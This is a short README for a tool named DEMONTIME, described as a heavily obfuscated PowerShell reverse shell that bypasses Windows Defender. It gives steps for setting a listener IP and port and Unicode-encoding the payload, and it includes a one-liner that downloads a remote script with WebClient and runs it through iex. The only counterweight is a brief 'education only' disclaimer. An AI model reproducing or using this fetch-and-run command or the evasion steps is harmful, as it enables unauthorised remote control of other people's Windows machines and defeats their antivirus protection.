<h1>DEMONTIME</h1>

<h2>**Heavily obfuscated PowerShell reverse shell that can bypass Windows Defender **</h2>

![image](https://github.com/aaronquiamco/demontime/assets/59388557/5958a915-6c07-42d4-8dda-dcc14cd0d9b4)



⚠️ Disclaimer: Employing the methods and principles outlined in this repository to obtain unauthorized entry into systems without proper authorization is against the law. You are accountable for your conduct. Act responsibly and refrain from engaging in malicious activities. This is for education purposes only


**Instructions**

1. Edit the Obfuscated PowerShell reverse shell one liner script with your chosen listener IP Address and Port number.
![image](https://github.com/aaronquiamco/experiment/assets/59388557/2f24cc8b-af55-429a-a7ac-97786da28d29)

2. Use the Python script to convert the PowerShell reverse shell one liner characters to its Unicode format.
![image](https://github.com/aaronquiamco/experiment/assets/59388557/ad971d49-e938-491b-92d8-27838499b5fa)

3. Replace the Unicode payload on the demontime.ps1 script with the output generated from the Python script.

**Optional**

Fork this repo so you can run the following one liner:
**NOTE: Replace the URL with your own forked repo.** 

```iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/xxxxxx/experiment/main/demontime.ps1');demontime```



